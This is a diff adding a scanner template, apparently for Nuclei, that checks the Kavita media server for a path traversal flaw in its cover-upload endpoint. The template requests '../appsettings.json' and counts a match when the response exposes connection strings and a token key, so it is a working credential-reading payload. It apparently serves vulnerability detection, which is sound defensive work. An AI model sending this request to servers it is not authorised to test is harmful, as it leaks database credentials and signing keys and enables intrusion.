@@ -1,0 +1,28 @@
+id: poc-kavita-cover-upload-path-traversal
+info:
+  name: Kavita Cover Upload Path Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/api/image/cover-upload?filename=../appsettings.json'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ConnectionStrings"
+          - "TokenKey"
+      - type: word
+        part: header
+        words:
+          - "appsettings.json"
+      - type: word
+        part: header
+        words:
+          - "image/json"
